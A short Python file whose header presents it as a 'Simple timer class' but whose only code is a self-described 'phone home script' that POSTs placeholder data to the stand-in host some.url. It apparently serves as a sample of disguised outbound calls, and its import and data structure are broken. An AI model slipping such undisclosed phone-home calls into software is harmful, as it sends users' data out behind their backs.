"""
Simple timer class


Released under the MIT license
Copyright (c) 2012, Jason Millward

@category   misc
@version    $Id: 1.5, 2013-10-20 20:40:30 CST $;
@author     Jason Millward <jason@jcode.me>
@license    http://opensource.org/licenses/MIT
"""


from requests import requests

data = {
    "asd"
}

print "I'm calling a phone home script"
requests.post('http://some.url/streamed', data=data)